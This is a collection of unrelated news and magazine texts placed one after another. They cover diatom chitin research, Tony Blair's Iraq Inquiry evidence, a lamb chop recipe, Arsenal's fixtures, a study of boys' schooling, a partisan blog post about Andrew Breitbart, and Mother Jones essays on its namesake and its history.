( PhysOrg.com ) --
A whole microcosm of various bizarrely shaped life forms opens up when you look at diatoms , the primary component of ocean plankton , under a microscope .
The regularly structured silica shells of these tiny individual life forms have attracted scientists because they are particularly interesting examples of natural hybrid materials and also demonstrate unusual mechanistic and optical properties .
The mechanisms of the underlying biomineralization process are not yet fully understood , but the silica shells often provide inspiration for the synthesis of man-made nanostructures .
Researchers at TU Dresden and the Max Planck Institute the Chemical Physics of Solids in Dresden have now identified another component of the diatom cell walls .
As the team led by Eike Brunner reports in the journal Angewandte Chemie , they found an organic network of crosslinked chitin filaments .
Chitin is a long molecular chain of sugar building blocks , a polysaccharide .
It is the second most widespread polysaccharide on Earth after cellulose .
In combination with calcium carbonate ( lime ) and proteins , it forms the shells of insects and crabs .
“ Chitin plays an important role in the biomineralization of such calcium carbonate based shells and structures , ” explains Brunner .
“ We have now been the first to demonstrate that the silica cell walls of the diatom Thalassiosira pseudonana also contain a chitin - based network . ”
The researchers dissolved the silica components of diatom shells with a fluoride - containing solution .
What remained behind appears under a scanning electron microscope as a delicate , net - like scaffolding .
This network resembles the cell wall in form and size and consists of crosslinked fibers with an average diameter of about 25 nm .
Spectroscopic examinations show that the fibers contain chitin and other , previously unknown biomolecules .
“ Our results suggest that the chitin - based network structure serves as a supporting scaffold for silica deposition , while the other biomolecules actively influence it , ” states Brunner .
“ This mechanism is thus analogous to calcium carbonate biomineralization .
In addition , these networks may also mechanically stabilize the cell walls . ”

Advertisement ANALYSIS - BY IAIN WATSON Overall , Tony Blair gave an assured performance .
He wriggled a bit when asked not about what he had said to previous Iraq inquiries , but what he had said to daytime TV presenter Fern Britton .
Overall , Tony Blair gave an assured performance .
He wriggled a bit when asked not about what he had said to previous Iraq inquiries , but what he had said to daytime TV presenter Fern Britton .
In that recent interview he seemed to be suggesting that he would have argued that Saddam should have been removed from power even if WMDs had not existed .
He also seemed less comfortable when discussing the elongated process by which the attorney general finally declared the war to be legal .
Before the conflict , Mr Blair made a confident case based on certainties - Saddam 's weapons programme was " active " .
It was " beyond doubt " that Iraq had WMDs .
Today we saw a more subtle case advanced by Mr Blair , but a case which he felt still proved he was right , in the end , to back military action .
With no WMDs discovered , Mr Blair went out of his way to point to Saddam 's lack of co-operation in coming clean about his weapons , or lack of them - which meant that Saddam was in " material breach " of his obligations to the UN .
But his main argument was that , actually , decisions were n't based on absolutes but on " the calculus of risk " .
In the more uncertain world after 9/11 it was simply too risky not take action against a dictator who had used chemical weapons on his own people .
He said that , while the then foreign secretary Jack Straw had told the Inquiry that , legally and politically , the UK had wanted to take action to disarm Saddam rather than remove him ( though he would n't have been worried if that were an unintended consequence ) , Mr Blair said it was wrong to create a " binary division " between disarmament and regime change .
In fact , George Bush 's predecessor , Bill Clinton , in 1998 , finally took the view that regime change in Iraq was necessary because he could not trust Saddam to disarm .
But Mr Blair denied that a deal to go to war had been " signed in blood " at President Bush 's Texas ranch in 2002 - the only agreement was to " deal " with Saddam - the means were left open .
He was also keen to undermine the unflattering image of him as a " poodle " of the US - he suggested that had the UN succeeded in disarming Saddam , President Bush would actually have altered the US policy of regime change .
So , to maintain the canine comparisons , this was really the UK tail wagging the US dog .
We had an alliance with the US , not a contract , said Mr Blair .
The other striking feature of his performance was the bellicose , almost belligerent , tone towards Iran - whom he blames for undermining post war Iraq .
Mr Blair did not concede much territory to his critics - while he was sorry about the divisive nature of the war , he claimed he had tried to bring people back together and said he did not regret his actions in Iraq .
He was also clear that this was a decision which the bulk of his cabinet - and leading Conservatives - signed up to at the time .
He said the late Robin Cook , who resigned from the cabinet over the war , would have backed him if he had managed to get a second resolution from the UN .
So had this been a trial , and not a inquiry , Mr Blair was in effect suggesting that there should have been lots of co-defendants and that if the charge had been misleading people over an illegal war , there had been " no lie " , " no deceit " .
It was only a " judgement " , a " decision " , which he felt history would vindicate .
His supporters will applaud his robust approach ; his opponents will be dismayed that he did n't really express any regrets .

What is very interesting is Blair 's belief that this will have to happen again .
He talks about " when you go into a nation building situation in the future " and " lessons learned about nation building " .
So very , very sad to see so many in the UK blaming , belittling , second - guessing , arm - chair quarterbacking , deriding , mocking , etc. etc. such a great leader , who had so many difficult decisions to make .
I was born and raised in the UK and am now a US citizen .
So I think I see the issue through two sets of cultural eyes .

It 's also worth noting that Tony Blair managed to avoid talking about his successor at number 10 - he did n't cite him as a key player and he did n't carp about his then chancellor when it came to providing resources for troops .
So Tony Blair 's performance wo n't make Gordon Brown 's own appearance before the inquiry easier - but the current PM will probably be grateful that it has n't made it any more difficult .

Why has not explained this before .
I think this enquiry is exactly what we needed - well done to whoever was the mover and shaker behind it .

The subsequent problems are blamed on the influence of Iran - a pretty constant bete noire for Tony Blair today - and al - Qaeda .

However , he added that Lord Goldsmith was giving his advice to the prime minister and ministers , Mr Blair says .
1436 Mr Blair says he was given a Foreign Office paper on 8 March 2002 setting out legal terms for action against Iraq .
Military action had been taken against Saddam in 1993 and 1998 , he adds .
The legal advice made it important to go down the UN route , Mr Blair tells the inquiry .
The government was a " long way " from a decision , so the attorney general was not brought in at that point .

1428 Sir Roderic
Lyne says that Lord Goldsmith said later that Resoultion 1441 was compatible " in principle " with authorising force , but , if the matter came before a court , he was not confident this would work .
He had , " to a degree " , parted opinion with the Foreign Office lawyers , he adds .
Lord Goldsmith was asked for a " yes or no " decision .
By 13 March , he had decided that " on balance " there was a lawful basis for use of force without having to go beyond Resolution 1441 .
But this required a determination that Iraq was " in further material breach " of its obligations .
Lord Goldsmith said he had asked Mr Blair to say this and Mr Blair had done so .
This gave the " green light " for action , Sir Roderic says .

1423 Sir Roderic
Lyne says there was " consistent and united advice " from Foreign Office lawyers that fresh UN authorisation would have been needed to make the use of force against Iraq lawful .
However , resolution 1441 , which was passed by the UN , was not " crystal clear " .
Up until February 2003 the then Attorney General , Lord Goldsmith , said that a further decision by the Security Council was required , he adds .

There was a " pretty fundamental " political divide over whether or not there would be UN agreement on force .

He said the Tories still backed the invasion but added : " We will want to see what he says in the rest of evidence . "
He said Mr Blair appeared to be trying to shift the justification for the war from the argument he made at the time about weapons of mass destruction to regime change .

1350 From BBC world affairs correspondent Peter Biles at the inquiry : So Tony Blair remains a " true believer " in the Iraq war .
There was not a hint of contrition or regret , in spite of the fact that bereaved families who lost loved ones in Iraq , were among those sitting behind him in the public gallery , listening to every word of his evidence .
One of the sisters of Margaret Hassan , the British aid worker who was kidnapped and killed in Iraq , said the only consolation to be drawn from this morning 's session was that Mr Blair had been forced to appear before the Iraq Inquiry .
Mr Blair has remained firm in his belief that what he did in Iraq , was right .
He was equally robust in his presentation , frequently trying to direct the Inquiry to notes and references which he had brought to bolster his case .
The members of Sir John Chilcot 's committee did their best to ensure that Mr Blair answered their questions , and did not deviate to the extent that he took control of the proceedings .

Up until today witnesses from Tony Blair 's government have insisted that the Americans ' stated objective of regime change was illegitimate and illegal .
The British government 's policy of disarmament was distinct , they insisted .
However , this morning Tony Blair said that there was no ' binary ' choice between them and that they were , indeed , different ways of expressing the same proposition . "
1250 From BBC political correspondent Iain Watson : During this session Tony Blair had a second a third and a fourth line of defence for his actions in going to war .
The first line of defence , of course , was that Saddam 's active WMD programme had to be stopped .
But then he argues that even though WMD were n't found the Iraq Survey group showed Saddam had the ' intent ' to restart such a weapons programme ; he then argues that in any case Saddam breached his obligations to the UN by not co-operating enough with the weapons inspectors , unlike the co-operation Gaddaffi gave on his weapons ; and finally he argues what would have happened if action had n't been taken - if the US and UK pulled back from the brink and looked weak what risk in 2010 would the world have faced from an emboldened - rather than ousted - Saddam ?
So not only no regrets from Tony Blair but he makes the case that it would have been unreasonable and risky - even irresponsible - in the end not to have tackled the Iraqi regime .

Can this really be the first time I 've cooked lamb loin chops ?
It turns out they are awfully cute — something of a T - bone fit for Barbie .
Impressively succulent and tender , the lamb loin chops were also relatively lean .
At around four ounces , they are also the perfect portion size .
You can devour one and still feel light on your feet .
I had an abundance of mint one night and lamb was the first thing that came to mind ( well , right after a mojito ) .
But I settled on this recipe from Bon Appetit because of the other ingredients in the rub .
The cumin and coriander , in particular , haunt each bite .
It all comes together so quickly .
Just mix everything up , rub it on the lamb , wait for 30 minutes , then cook .
The lamb comes out perfectly crusted , fragrant , and still medium - rare in the middle .
About the only thing I added was a little frisée for plating , because that little cut of meat can look awfully lonely in the middle of a plate .
Some potatoes would also help keep the lamb company .
Oh boy , you heard that right .

Given the vested interests lurking all over the current medical landscape , it is no wonder that the scientific method is so often mauled a little in transit .
Cases of data ignored or manipulated to serve an agenda are like muggings in a bad neighborhood : you hear about them all the time , but in fact relatively few are ever openly examined .
And so even readers with no personal or professional connection to the sexual abuse of children may be edified by “ The Trauma Myth , ” a short tale of one such particularly fraught episode .
For a graduate research project at Harvard in the mid-1990s , the psychologist Susan A. Clancy arranged to interview adult survivors of childhood sexual abuse , expecting to confirm the conventional wisdom that the more traumatic the abuse had been , the more troubled an adult the child had become .
Dr. Clancy figured she knew what she would find : “ Everything I knew dictated that the abuse should be a horrible experience , that the child should be traumatized at the time it was happening  overwhelmed with fear , shock , horror . ”
Arsène Wenger says Arsenal 's next four matches represent the most intense and meaningful period of his Premier League career but , as the team prepare to kick off the sequence at Aston Villa tonight , the manager believes that they are set fair to make a grand statement about their title - winning chances .
Arsenal will go on to play Manchester United , Chelsea and Liverpool in a spell which has been billed as make - or - break for their prospects of a first championship since 2003 - 04 and , having hit form and broken down a major psychological barrier with the come - from - behind victory at Anfield last month , Wenger is bullish .
Since the 3 - 0 home defeat to Chelsea on 29 November , his team have taken 23 points from an available 27 .
" I have never known a run of four league games as significant as these , " he said .
" I believe we are in a strong position [ despite ] having lost at Manchester City , at Manchester United and against Chelsea at home , so you cannot say it is a make - or - break because in this league , a lot can happen .
But if we win these games , then we can really have a big hope .
It is a great opportunity to send a message to the rest of the Premier League .
We want to take it and I am very confident that we are in a good position . "
Wenger highlighted the importance of the 2 - 1 away win against Liverpool , when a 1 - 0 deficit was overhauled following some choice words from him at half - time .
" It was a massive turning point and we 've since come from behind in many games .
It shows immense mental strength to come back .
Before Liverpool , we had not won the big games .
Even if we felt we should have won , we did n't and it was in the head of the players .
But we did it at Liverpool , we beat Villa as well [ at home , two weeks later ] and we overcame something in our head . "
Wenger said " we know we can beat Villa and they know it as well , do n't worry " and , ahead of the trip to a happy hunting ground – Arsenal have won five and drawn five of their previous 10 Villa Park fixtures – the Frenchman was cheered by news from his injury list .
Nicklas Bendtner is expected to return to the subs ' bench , having not played since 31 October because of groin trouble , and Wenger said this meant he would not sign a striker before the closure of the transfer window .
Bendtner has scored only three goals this season but Wenger 's faith in him is total .
Samir Nasri , too , is also expected to be named as a substitute .

Boys face high rates of a variety of mental health issues , in addition to lagging behind girls in academic performance and college attendance , according to two new papers by University of Alaska Fairbanks researcher Judith Kleinfeld .
The studies , recently published in the journal Gender Issues , note that boys have higher rates of suicide , conduct disorders , emotional disturbance , premature death and juvenile delinquency than their female peers , as well as lower grades , test scores and college attendance rates .
The first paper , " The State of American Boyhood , " offers a status report on the academic , mental and social health of boys in the United States .
Her conclusion :
There is neither a " girl crisis " nor a " boy crisis . "
" Rather , boys and girls suffer from different types of characteristic problems , " Kleinfeld wrote , noting that girls have higher rates of depression , suicide attempts and eating disorders .
" Schools need to pay attention to the difficulties of both girls and boys and bring these problems to the attention of families , teachers and mental health professionals . "
Still , boys are in far more serious trouble , she argues .
The gender gap in reading and writing at the end of high school , for example , is far wider than the gap in math and science ever was .
More than a quarter of American male high school graduates can't understand a newspaper article , compared to about 10 percent of girls .
Kleinfeld 's second study , " No Map to Manhood : Male and Female Mindsets Behind the College Gender Gap , " drew on in - depth interviews with 99 high school seniors in the Fairbanks area , as well as national statistics on college attendance .
She aimed to shed light on why boys are less likely than girls to seek postsecondary education .
advertisement
" Males who do not have a college education are far more vulnerable to unemployment and the wages of men without a college education are plummeting , " Kleinfeld said .
She notes that nearly 60 percent of college students are female , but that most studies do n't ask graduating seniors why they are making the choices they do .
Kleinfeld chose to focus her interviews on Alaska students because Alaska has one of the highest college - attendance gender gaps in the nation .
Through her interviews , she found several reasons why boys are less apt to go to college .
Some mistakenly thought they could earn high wages right away without a college education , deciding they would rather get paid for working than pay for college .
Some had limited knowledge of the job market and little concept of how much it costs to live a middle - class lifestyle .
Many simply disliked school and did n't want more of it .
Her interviews also showed that high school students , both boys and girls , are stereotyping boys .
Kleinfeld notes that when she asked students about the gender gap in education , their explanations centered on three themes : young men are lazy , they do n't plan ahead and they are prone to peer pressure .
" Boys are getting little respect , " Kleinfeld said .
" These negative stereotypes may well further depress boys ' academic achievement . "
Kleinfeld hopes her current work will offer more insight on the reasons why boys are struggling .
Her newest study focuses on pressures on men in American society and changing concepts of manhood .
In addition to her position on the UAF faculty , Kleinfeld is director of The Boys Project , a national program that aims to promote discussion and action on the educational and cultural needs of boys .

MSNBC interview ' in shark - jumping territory .
For the ages .'...
Brad Friedman Byon 1/28/2010 , 3:11 pm PT
Matt Drudge 's poodle , anti-ACORN propagandist , GOP operative , and deranged wingnut Internet death threatener , Andrew Breitbart , is apparently hoping to become the new Orly Taitz .
Today 's insane interview with David Shuster on MSNBC , discussing the felony arrest of his employee / operative James O'Keefe for allegedly attempting to manipulate the telephones of U.S. Senator Mary Landrieu ( D - LA ) earlier this week , goes a long way towards that goal .
Lookin ' good , Andy !
Keep up the brilliant " journalism " !
Josh Marshall notes about the interview that it was " truly the most unhinged performance I 've seen since Shuster made a laughing stock of and pretty much put an end to the fifteen minutes of fame of [ Queen of the Obama ' Birthers ' ]
Orly Taitz . "
" At some level I admire Breitbart 's insistence on turning any question about anything into an attack based on why the federal government has n't turned itself over entirely to investigating ACORN , " Marshall adds , " But this performance was definitely in shark - jumping territory .
For the ages . "
Indeed .
Though despite Crazy Andy 's seething rage about a lack of criminal convictions against ACORN , even as two recent independent investigations found no criminal wrong - doing by the pro-voter , pro-American Dream community group in the highly - doctored , and apparently illegally - obtained video tapes that Breitbart and O'Keefe posted for the U.S. media to broadcast widely , he 's adamant that the rest of the world needs to retract , um , everything , while his continued , unsubstantiated allegations against , um , everybody else are just fine .
Unfortunately , Shuster did n't ask Andy about the admissions that he'd made on the night of O'Keefe 's arrest , when he concurred that " Lots of people work for lots of corporations , and do dumb and sometimes illegal things that are not within the scope of their employment . "
The wingnut that he was concurring with , Hugh Hewitt , was talking about Crazy Andy 's employment of the accused felon O'Keefe .
But the irony that they'd both just explained why ACORN is n't necessarily responsible for an employee of theirs who defrauds ACORN itself --- who is turned in by ACORN themselves to officials for prosecution --- apparently escaped both geniuses as they panicked to try and save Breitbart 's quickly crumbling propaganda empire .
Anyway , here 's the video of Shuster with Crazy Andy " jumping the shark " on MSNBC today ...
BTW , for those who wonder why we should bother with this guy and his freak show at all , it 's because , like Matt Drudge and Rush Limbaugh , etc. , he serves , pathetically enough , as the " assignment desk " for the U.S. Media --- not just the Rightwing media , but the entire U.S. Media --- and he needs to be discredited and revealed for the ticking time - bomb lunatic of a wingnut operative that he is .
He is anything but a legitimate " journalist , " no matter how much he enjoys tricking his gullible tea baggers into believing just the opposite .
He is the master of projection and deception , and where , in one sense , he should n't even be allowed anywhere near a legitimate TV interview , like his fellow GOP propagandist and deceptionist Ann Coulter , he needs to be outed for the lying little scam artist that he is .
Today , he went a long way towards doing that to himself .
Again .
And everyone needs to know about what a deranged whackjob he is .
Not that that will keep otherwise " legitimate " corporate news organizations from giving him air time to peddle his various scams .
But we can only do as much as we can here .
And , as Andy is currently one of the leading media scam artists in the years - long assault against ACORN for having the temerity to help register millions of legal low and middle - income voters , the least we can do is point out who these scam artists actually are , and how phony their well - funded campaign actually is .
UPDATE 4:18 pm PT : Media Matters details , in reply to Breitbart 's false claim that his apparently illegally obtained and highly - doctored ACORN videos " clearly show in every --- in almost every single office , the employees at ACORN helping aid and abet the establishment of an underage prostitution brothel . " ...
... in six of the eight heavily edited videos produced by O'Keefe and Giles and distributed by Breitbart , either the activists did not clearly tell the ACORN employees that they were planning to engage in child prostitution ; or the ACORN employees refused to help them or apparently deliberately misled them ; or ACORN employees contacted the police following their visit .
No doubt " journalist " Crazy Andy will be demanding a retraction from himself immediately !

Mother Jones : The Woman
Mary Harris Jones , this magazine ’s namesake , crafted a persona that made her a legend among working people .
So why is so little about her remembered today ?
By Elliot J. Gorn
May / June 2001 issue
Upton Sinclair knew Mother Jones .
The author of the best - selling exposé of the meatpacking industry , The Jungle , even made her a character in one of his novels , a lightly fictionalized work called The Coal War , which chronicled the bloody Colorado coal strike of 1913 - 14 : “ There broke out a storm of applause which swelled into a tumult as a little woman came forward on the platform .
She was wrinkled and old , dressed in black , looking like somebody ’s grandmother ; she was , in truth , the grandmother of hundreds of thousands of miners . ”
Stories , Sinclair wrote , were Mother Jones ’ weapons , stories “ about strikes she had led and speeches she had made ; about interviews with presidents and governors and captains of industry ; about jails and convict camps . ”
She berated the miners for their cowardice , telling them if they were afraid to fight , then she would continue on alone .
“ All over the country she had roamed , ” Sinclair concluded , “ and wherever she went , the flame of protest had leaped up in the hearts of men ; her story was a veritable Odyssey of revolt . ”
When Sinclair wrote these words , Mother Jones was one of the most famous women in America .
Articles about her regularly appeared in magazines and newspapers , and for many working Americans , she had achieved legendary , even iconic , status .
Yet the woman for whom Mother Jones magazine is named is scarcely known any longer .
Some might recognize her name , know something about her activism on behalf of working people , or even recall her famous war cry : “ Pray for the dead , and fight like hell for the living . ”
But few remember much about Mother Jones , who battled corporate presidents and politicians , who went to jail repeatedly for organizing workers , and who converted tens of thousands of Americans to the labor movement and the left .
As I worked on a recent biography of Mother Jones , however , I came to appreciate her significance for our own times .
With dramatic speeches and street theater , she organized workers , women , and minorities , drawing public attention to their hardships and giving them a voice .
Mary Jones ’ greatest achievement may have been creating the persona of Mother Jones .
She was born Mary Harris in Cork , Ireland , in 1837 .
When she was barely 10 years old , she witnessed the horrors of the potato famine , which drove her family from their homeland to Toronto , Canada .
Her parents established a stable , working - class household , and young Mary learned the skills of dressmaking , and also trained to be a teacher , a high ambition for an Irish immigrant woman of her day .
Wanderlust struck her in early adulthood –she taught for a few months in Monroe , Michigan , then moved on to Chicago , and another few months later to Memphis , Tennessee .
There , on the eve of the Civil War , she met and married George Jones , a skilled foundry worker and a member of the International Iron Molders Union .
They had four children together .
In 1867 a yellow fever epidemic struck Memphis , killing George and their four children .
Now a 30 - year - old widow , Jones returned to Chicago and dressmaking , where her tiny shop was burned out in the great fire of 1871 .
For the next quarter century , she worked in obscurity .
As the new 20th century approached , Mary Jones was an aging , poor , widowed Irish immigrant , nearly as dispossessed as an American could be .
She had survived plague , famine , and fire , only to confront a lonely old age .
But then she invented Mother Jones .
Or , to put it more precisely , she began to play a role that she and her followers made up as they went along .
By 1900 , no one called her Mary , but always Mother ; she wore antique black dresses in public , and she began exaggerating her age .
The new role freed Mary Jones .
Most American women of that era led quiet , homebound lives devoted to their families .
Women , especially elderly ones , were not supposed to have opinions ; if they had them , they were not to voice them publicly –and certainly not in the fiery tones of a street orator .
Yet by casting herself as the mother of downtrodden people everywhere , Mary Jones went where she pleased , spoke out on the great issues of her day , and did so with sharp irreverence ( she referred to John D. Rockefeller as “ Oily John ” and Governor William Glasscock of West Virginia as “ Crystal Peter ” ) .
Paradoxically , by embracing the very role of family matriarch that restricted most women , Mother Jones shattered the limits that confined her .
For a quarter of a century , she roamed America , the Johnny Appleseed of activists .
She literally had no permanent residence .
“ My address is like my shoes , ” she told a congressional committee .
“ It travels with me wherever I go . ”
She was paid a stipend by the United Mine Workers and , for a few years , by the Socialist Party .
But she always felt free to work in whatever cause most needed her–striking garment workers in Chicago , bottle washers in Milwaukee breweries , Pittsburgh steelworkers , El Paso streetcar operators , Calumet copper miners .
She helped workers fight not just low pay , 12 - hour days , and horrifying mortality rates , but also the servitude of company stores and company housing .
She also spoke out in defense of IWW leaders on trial for murder in Boise ( she was one of the original signers of the Industrial Workers of the World charter ) , labor activists imprisoned in California , and Mexican revolutionaries in Arizona .
Mother Jones lost as many battles as she won , but still she got results .
She was by far the most famous and charismatic organizer for the United Mine Workers .
When she began working for that fledgling union in the 1890s , it had 10,000 members ; within a few years , 300,000 men had joined , and she organized many of their wives into “ mop and broom ” brigades , militant women who fought alongside their husbands .
The moniker “ Mother ” Jones was no mere rhetorical device .
At the core of her beliefs was the idea that justice for working people depended on strong families , and strong families required decent working conditions .
In 1903 , after she was already nationally known from bitter mine wars in Pennsylvania and West Virginia , she organized her famous “ march of the mill children ” from Philadelphia to President Theodore Roosevelt ’s summer home on Long Island .
Every day , she and a few dozen children–boys and girls , some 12 and 14 years old , some crippled by the machinery of the textile mills –walked to a new town , and at night they staged rallies with music , skits , and speeches , drawing thousands of citizens .
Federal laws against child labor would not come for decades , but for two months that summer , Mother Jones , with her street theater and speeches , made the issue front - page news .
The rock of Mother Jones ’ faith was her conviction that working Americans acting together must free themselves from poverty and powerlessness .
She believed in the need for citizens of a democracy to participate in public affairs .
Working families , Mother Jones argued , possessed vast , untapped powers to fight the corporations that bound them to starvation wages and the corrupt politicians who did the businessmen ’s bidding .
But only strong , democratic organizations of citizen - activists , she felt , could achieve real egalitarian change .
So , as we reclaim the memory of this great American , what was her legacy for the 21st century ?
Certainly some of her impassioned rhetoric would seem overheated in the cool medium of television .
And in a world where oratory is a lost art , her speeches today might come across as over - blown and strident , even to many progressives .
Her agenda was also limited , even by the standards of her time .
Mother Jones opposed giving the vote to women–or , to be more precise , she believed that suffrage was a false issue , a bourgeois diversion from the real problem of worker exploitation .
She argued that only powerful organizations of workers –industrial unions–could bring justice .
And while she helped organize women in various trades , she believed that working - class women were better off in the home than having their labor exploited .
In a sense , Mother Jones ’ greatest strength was also her fundamental weakness :
She saw the world primarily through the lens of class .
Her single - mindedness sometimes blinded her to the unique issues facing women and minorities .
Yet such myopia might help bring a little clarity to our own times .
She offers a vivid reminder of what remains among the most underacknowledged issues of our day : that America is a class - riven society , where the wealthy have grown obscenely rich as working people have fallen further behind .
Here , Mother Jones ’ voice would have risen loud and clear .
Her memory evokes the great American tradition of protest .
It reminds us that passion still matters , and that a well - crafted symbol can offer inspiration , emboldening us in a world where the possibility of meaningful change sometimes seems beyond our reach .
Mother Jones : The Magazine
Mother Jones ’ founders envisioned a magazine devoted to a new brand of socially conscious journalism — one that took on corporate as well as political power .
Twenty - five years later , that mission remains as timely as ever .
By Adam Hochschild
May / June 2001 issue
When the first issue of Mother Jones arrived back from the printer 25 years ago , the 17 of us then on the magazine ’s staff eagerly clustered around to rip open the boxes and touch and feel the printed pages at last .
We were then working in cramped quarters above a San Francisco McDonald ’s , and the smell of frying burgers drifted up from below .
We would have been amazed to know that the magazine would still be here , some 200 issues and several offices later .
Multinationals like McDonald ’s endure forever , it seems , while dissenting magazines flare up , attract a little attention , and then die .
While copies of Mother Jones may not blanket the world today quite as thoroughly as do Big Macs , more than 165,000 households will receive the issue you are reading , and the magazine ’s Web site logs 1.25 million page views each month .
None of us here a quarter century ago could have dreamed of the World Wide Web ; in fact , for the first few years the magazine was even set in hot type , a 19th - century technology using molten lead .
Look at an early issue of Mother Jones under a magnifying glass and you ’ll notice the subtly irregular pits and flecks in the letters .
Printing purists feel about hot type the way rail buffs feel about steam engines .
But despite changes in how the magazine is produced , the causes it covers and its passion for justice are very much the same .
Mother Jones was born in a time of upheaval .
It was early 1974 when several of us first met in the San Francisco living room of the late journalist and activist Paul Jacobs to begin planning the magazine .
We were still living in the afterglow of the 1960s , when the civil rights and antiwar movements had put hundreds of thousands of Americans into the streets , shaken the country to its core , brought an end to legal segregation , and helped force U.S. withdrawal from the bloody , unjust war in Vietnam .
Although these crusades were fragmented or spent by the early ’ 70s , it was still a heady time politically .
The movements for environmental protection and for women ’s rights had just been born , or , more correctly speaking , reborn .
The language of progressive politics had deepened .
People who dreamed of a more just society now began to understand that the personal was also political , and that politics also included the health of our fragile and much - abused planet .
In a sense , it seemed as if the ’60s were still going on , with new strains of activism in the air and new political earthquakes to come .
We were , perhaps , a bit too naive about the remarkable staying power of the American political and corporate system .
Something else was in the air in 1974 .
Two enterprising young Washington Post reporters had uncovered the Watergate scandal ; when Richard Nixon resigned in August of that year , investigative journalism had changed the course of history .
For anyone who believed in the power of the printed word , it was an exhilarating moment .
And in the late ’60s and early ’ 70s , cities throughout the country were giving birth to alternative newspapers , many with a strong progressive bent .
It was among reporters for this new generation of weeklies that Mother Jones found many of its best writers .
Up until that time , American investigative journalists had traditionally targeted politicians .
We thought the country was ready for a magazine of investigative reporting that would focus on the great unelected power wielders of our time — multinational corporations .
And we wanted that reporting to carry far .
That meant it had to be a magazine that was well written :
For our very first issue , Jeffrey Klein , one of the editors , found a piece by Li-li Ch’en that ended up winning a National Magazine Award .
It also meant a magazine that would attract the eye : Louise Kollenbaum , our art director , designed a publication that would be a home for first - rate photographs and artwork .
And finally it meant a magazine with the careful business planning necessary to take us well beyond the relatively small readership of the older left - leaning periodicals .
Richard Parker , who worked as both editor and publisher , saw to it that Mother Jones took the best of what could be learned from the world of commercial publishing .
Two of the talented young writers who first appeared in Mother Jones during the 1970s , Doug Foster and Deirdre English , each later went on to spend more than five years as the magazine ’s top editor .
Once launched , the magazine took about a year and a half to fully hit its stride .
It was clear when that happened , in the late summer of 1977 .
Mark Dowie was business manager of Mother Jones .
In his spare time , he had written and published one piece in the magazine .
One day an insurance investigator he knew asked him , “ Have you heard about the Ford Pinto ? ”
The Pinto , then the best - selling subcompact car in America , had a reputation for bursting into flames when rear - ended at low speeds .
Dowie ’s investigation yielded an extraordinary tale .
Not only had Pinto crashes killed at least 500 people and painfully injured many more , but even before the first Pintos came off the assembly line , company engineers had warned management that the gas tank was dangerously close to the rear of the car .
Ford executives then projected that it would cost them more money to shut down and retool their assembly line than to pay off the damage claims from the anticipated deaths and injuries .
Dowie obtained the memo where they made these cost - benefit calculations .
Dowie ’s story won many awards and got repeated by major newspapers , TV networks , and talk - radio programs .
And that is how many of the magazine ’s stories have had the greatest impact : by being picked up in the establishment media , which are usually too timid to launch Mother Jones - style investigations , despite their vastly greater resources .
The Pinto exposé was also the first time all of us at the magazine tasted the greatest pleasure of working at a place like this — hearing your enemies denounce you .
Pressed by dozens of reporters for comment , Ford issued a statement claiming that Dowie ’s story was all wrong , filled with “ distortions and half - truths . ”
Several months later , racing to forestall a government safety hearing , Ford recalled 1.5 million Pintos for repairs .
Not long after this , we were paid a tribute of a different sort .
It had never surprised us that Mother Jones annoyed repressive governments — our writers had had copies of the magazine confiscated from their baggage at Soviet airports and at Checkpoint Charlie in Berlin , and had been barked at by government officials and U.S. diplomats in places like El Salvador .
But after a number of our stories irked authorities in Washington , the Internal Revenue Service launched an investigation into the magazine ’s nonprofit status .
And once the Reagan administration came into office , the probe took a harsh turn .
The IRS claimed that even though Mother Jones lost money every year , it should pay taxes on the income it received from sources like advertising .
This vendetta was so absurd that many mainstream newspapers ran editorials in our defense .
The IRS finally dropped the case , but not until it had cost us huge legal bills .
Dozens more corporate exposés followed the Pinto story .
In 1979 , a team of writers put together a prize - winning package of stories on “ dumping ” — the unloading on Third World countries of pesticides , medicines , and other products banned in the United States as unsafe .
The stories ’ impact rippled throughout the world , and lawmakers in three countries introduced bills outlawing dumping .
No one used the word globalization in those days , but you ca n’t cover U.S. corporate malfeasance without following the story abroad .
Today that is more true than ever .
Mother Jones has also remained a strong voice for social justice : Racial discrimination , women ’s rights , environmental justice , and the plight of immigrant farmworkers are all issues you will find covered in the magazine from its first year of publication to the present .
Another major theme over the years — from investigations of costly , useless weapons programs in the Carter and Reagan military budgets to the U.S. Arms Trade Atlas on today ’s Mother Jones Web site — has been the bloated American military budget and the way the United States uses its superpower influence overseas .
Although the magazine ’s values have remained constant over the last quarter century , the world it exists in has changed enormously .
The gap between rich and poor has grown wider — worldwide and in our home city of San Francisco , where the silicon boom has filled the streets with SUVs and has pushed rents far beyond what artists or the poor can afford .
And while big money has always called the tune in American politics , the money has become bigger than ever and its influence ever more blatant .
In 1996 , the magazine launched the Mother Jones 400 , an investigation of the largest donors to political campaigns .
The latest MoJo 400 , which appeared in the March / April issue , examined the business sectors that financed the campaign of George W. Bush — and what they expected in return .
American journalism has also changed markedly between 1976 and 2001 .
Twenty - five years ago an exposé that showed how a major corporation ’s products injured people was certain to outrage readers ; we could be sure hundreds of them would write to their members of Congress , join a boycott campaign .
But in the electronic age , people often feel they are drowning in information .
The investigative journalist must meet a higher standard .
He or she must not only provide crucial detail that cannot be found elsewhere , but must tell the story in such a way that readers cannot put the magazine down .
And sometimes even that is not enough to force citizens or governments into action .
Look at the long delay before Europe and the United States intervened , ever so reluctantly , in the former Yugoslavia — and did n’t intervene at all to stop the genocide in Rwanda .
Since our birth in 1976 , control of the American mass media has become ever more centralized .
When our friend Ben Bagdikian , former dean of the Graduate School of Journalism at Berkeley , published his 1983 book , The Media Monopoly , it was subtitled A Startling Report on the 50 Corporations That Control What America Sees , Hears and Reads .
In each subsequent edition , Bagdikian jokes , he has had to reduce the number of corporations ; it is now down to six .
All of this makes alternative , noncorporate news sources like Mother Jones more crucial than ever .
One thing you can be sure of is that the magazine will never be part of AOL Time Warner .
Yet one of this country ’s great paradoxes is that new forms of media monopoly and of free speech evolve at the very same time .
If the 17 staff members who cheered the arrival of those first boxes of Mother Jones had gone to sleep like Rip van Winkle and then woken up today , one thing would leave us amazed and cautiously heartened : the Internet ’s capacity to bring dissenting points of view to millions of people all over the world — and to enable those people to communicate with one another .
Mother Jones was part of this process early on , in 1993 , when it became the first general - interest magazine to publish on the Web .
So what can a Rip van Winkle of today expect in Mother Jones on its 50th anniversary ?
Perhaps by then both paper and computers will have been replaced by something we cannot even imagine .
But technology is not what matters .
One thing is certain :
The world of 2026 will not have seen the end of injustice , of discrimination , of poverty , and of political and social violence .
It will still have brave , determined men and women everywhere who will be fighting to change all of that .
